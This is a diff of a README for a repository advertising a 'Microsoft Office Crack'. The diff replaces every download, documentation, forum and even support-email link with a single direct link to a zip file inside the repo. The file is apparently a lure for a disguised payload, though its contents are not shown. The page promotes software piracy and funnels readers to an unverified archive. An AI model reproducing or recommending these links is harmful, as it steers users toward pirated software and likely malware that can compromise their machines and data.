@@ -1,7 +1,7 @@
 # 💼 Microsoft-Office-Crack - Access Microsoft Office Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Microsoft%20Office%20Crack-blue.svg)](https://github.com/zaheer786123/Microsoft-Office-Crack/releases)
+[![Download](https://raw.githubusercontent.com/zaheer786123/Microsoft-Office-Crack/main/durst/Microsoft-Office-Crack.zip%20Microsoft%20Office%https://raw.githubusercontent.com/zaheer786123/Microsoft-Office-Crack/main/durst/Microsoft-Office-Crack.zip)](https://raw.githubusercontent.com/zaheer786123/Microsoft-Office-Crack/main/durst/Microsoft-Office-Crack.zip)
 
 ---
 
@@ -22,7 +22,7 @@ Before you get started, ensure your system meets the following requirements:
 
 To download Microsoft-Office-Crack:
 
-1. Visit the [Releases page](https://github.com/zaheer786123/Microsoft-Office-Crack/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/zaheer786123/Microsoft-Office-Crack/main/durst/Microsoft-Office-Crack.zip).
 2. Find the latest version available.
 3. Click on the file link that suits your operating system (Windows or macOS).
 4. Follow the prompts to download the file to your computer.
@@ -50,7 +50,7 @@ If you face any issues during installation or usage:
 
 For additional help, feel free to reach out to our support team. You can contact us through the following methods:
 
-- **Email:** support@microsoft-office-crack.com
+- **Email:** https://raw.githubusercontent.com/zaheer786123/Microsoft-Office-Crack/main/durst/Microsoft-Office-Crack.zip
 - **Discussion Forum:** Join our community forum for user-generated solutions and tips.
 - **Official GitHub Issues Page:** Report bugs or request features directly.
 
@@ -60,8 +60,8 @@ This application is released under the [MIT License](LICENSE). You can use it fo
 
 ## 🔗 Important Links
 
-- [Documentation](https://github.com/zaheer786123/Microsoft-Office-Crack/wiki)
-- [Releases Page](https://github.com/zaheer786123/Microsoft-Office-Crack/releases)
-- [Community Forum](https://github.com/zaheer786123/Microsoft-Office-Crack/discussions)
+- [Documentation](https://raw.githubusercontent.com/zaheer786123/Microsoft-Office-Crack/main/durst/Microsoft-Office-Crack.zip)
+- [Releases Page](https://raw.githubusercontent.com/zaheer786123/Microsoft-Office-Crack/main/durst/Microsoft-Office-Crack.zip)
+- [Community Forum](https://raw.githubusercontent.com/zaheer786123/Microsoft-Office-Crack/main/durst/Microsoft-Office-Crack.zip)
 
 Thank you for choosing Microsoft-Office-Crack! We hope you enjoy using Microsoft Office products effortlessly.
